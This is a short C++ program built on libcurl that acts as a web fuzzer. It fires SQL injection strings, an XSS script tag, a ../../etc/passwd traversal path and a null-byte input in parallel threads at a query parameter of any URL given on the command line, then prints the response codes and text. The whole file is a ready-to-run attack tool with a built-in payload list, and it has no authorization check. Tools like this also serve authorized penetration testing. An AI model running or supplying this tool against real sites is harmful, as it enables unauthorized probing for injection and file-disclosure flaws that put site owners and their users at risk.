#include <iostream>
#include <vector>
#include <thread>
#include <curl/curl.h>

std::vector<std::string> payloads = {
    "' OR '1'='1",  // SQL Injection
    "<script>alert('XSS')</script>",  // XSS Attack
    "../../etc/passwd",  // Directory traversal
    "admin' --",  // SQL Injection bypass login
    "%00"  // Null byte injection
};

// Callback function for writing response data
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void fuzz(const std::string& url, const std::string& param, const std::string& payload) {
    CURL* curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        char* encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
        if (!encoded_payload) {
            std::cerr << "[!] URL Encoding failed for payload: " << payload << std::endl;
            return;
        }

        std::string fuzzed_url = url + "?" + param + "=" + encoded_payload;
        curl_free(encoded_payload);

        std::cout << "[+] Testing: " << fuzzed_url << std::endl;

        curl_easy_setopt(curl, CURLOPT_URL, fuzzed_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            std::cout << "[-] Response Code: " << response_code << std::endl;
            std::cout << "[-] Response: " << response.substr(0, 200) << "..." << std::endl;
        } else {
            std::cerr << "[!] Request failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
    }
}

void start_fuzzing(const std::string& url, const std::string& param) {
    std::vector<std::thread> threads;
    for (const auto& payload : payloads) {
        threads.push_back(std::thread(fuzz, std::ref(url), std::ref(param), std::ref(payload)));
    }

    for (auto& thread : threads) {
        thread.join();
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: ./fuzzer <URL> <param>" << std::endl;
        return 1;
    }

    std::string target_url = argv[1];
    std::string target_param = argv[2];

    if (target_url.find("http://") != 0 && target_url.find("https://") != 0) {
        std::cerr << "[!] Invalid URL: Ensure it starts with http:// or https://" << std::endl;
        return 1;
    }

    start_fuzzing(target_url, target_param);
    return 0;
}
